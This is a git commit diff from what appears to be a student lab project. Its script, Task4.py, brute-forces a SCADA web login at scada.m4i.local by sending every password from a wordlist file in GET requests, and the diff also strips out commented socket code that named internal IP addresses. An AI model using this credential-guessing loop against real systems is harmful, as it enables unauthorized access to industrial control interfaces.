26f89b8c51672c6f72cb3dcf082905bf7af18d71
Lucas96Mireles <Lucas96Mireles@gmail.com>
2019-01-22 16:17:34 -0500

    Task 4 is done baby

--- Project/Task 3,4/Task4.py
+++ Project/Task 3,4/Task4.py
@@ -10,23 +10,9 @@ import time
 import random
 
 
-
-#dest_ip = "10.12.1.244"	# scada.m4i.local 
-#dest_port = 80	# web based
-#source_ip = "10.204.0.13"
-#clientSocket = socket(AF_INET, SOCK_STREAM)
-#clientSocket.connect((dest_ip, dest_port))
-#
 with open("passwords.txt") as file:
 	passwords = file.read().splitlines()
 	
 for password in passwords:
 	URL = 'http://scada.m4i.local/login.php?command={}'.format(password)
 	ihatemylife = requests.get(url = URL)
-	#message = "GET /login.php?command={} HTTP/1.1\r\n".format(password)
-	#clientSocket.send(message.encode())
-	#time.sleep(0.1) #dont overload buffer
-#message = "GET /login.php?command={} HTTP/1.1\r\n\r\n".format("password")
-#clientSocket.send(message.encode())
-#sentence = input("press enter to close socket")
-#clientSocket.close()
